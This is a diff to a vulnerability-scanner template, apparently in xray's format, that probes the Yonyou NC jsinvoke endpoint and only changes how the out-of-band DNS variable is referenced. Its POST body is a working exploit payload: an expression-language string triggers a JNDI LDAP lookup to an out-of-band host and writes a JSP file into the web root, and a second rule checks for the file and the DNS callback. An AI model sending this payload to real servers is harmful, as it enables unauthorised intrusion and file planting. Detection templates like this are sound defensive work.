@@ -14,19 +14,17 @@ info:
 
 set:
   randstr: randomLowercase(6)
-  oob: oob()
-  oobDNS: oob.DNS
 rules:
   r0:
     request:
       method: POST
       path: /uapjs/jsinvoke/?action=invoke
       body: |
-        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://{{oobDNS}}')}","webapps/nc_web/{{randstr}}.jsp"]}
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://{{oob.DNS}}')}","webapps/nc_web/{{randstr}}.jsp"]}
     expression: response.status == 200
   r1:
     request:
       method: GET
       path: /{{randstr}}.jsp
-    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+    expression: oobCheck(oob.ProtocolDNS, 5)
 expression: r0() && r1()
